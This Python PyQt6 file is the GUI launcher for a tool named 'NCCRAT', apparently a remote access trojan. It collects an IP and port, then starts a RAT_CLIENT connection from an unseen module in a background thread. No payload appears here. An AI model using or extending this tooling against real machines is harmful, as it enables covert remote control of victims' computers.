import sys
import threading
from PyQt6.QtWidgets import QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QMessageBox
from client import RAT_CLIENT

class ClientGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()
    
    def init_ui(self):
        self.setWindowTitle("NCCRAT CLIENT")
        self.setGeometry(500, 500, 300, 200)
        
        layout = QVBoxLayout()
        
        self.ip_label = QLabel("IP Address:")
        layout.addWidget(self.ip_label)

        self.ip_input = QLineEdit(self)
        layout.addWidget(self.ip_input)

        self.port_label = QLabel("Port:")
        layout.addWidget(self.port_label)

        self.port_input = QLineEdit(self)
        layout.addWidget(self.port_input)
        
        self.connect_button = QPushButton("Connect", self)
        self.connect_button.clicked.connect(self.connect_to_server)
        layout.addWidget(self.connect_button)
        
        self.setLayout(layout)
        
    def connect_to_server(self):
        host = self.ip_input.text()
        port = int(self.port_input.text())
        
        try:
            self.rat = RAT_CLIENT(host, port)
            self.rat.build_connection()
            threading.Thread(target=self.rat.excute).start()
            QMessageBox.information(self, "Success!", f"Connected to {host}:{port}!")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to connect to {host}:{port}: {e}")

    
    
def main():
    app = QApplication(sys.argv)
    client_gui = ClientGUI()
    client_gui.show()
    sys.exit(app.exec())
    
if __name__ == "__main__":
    main()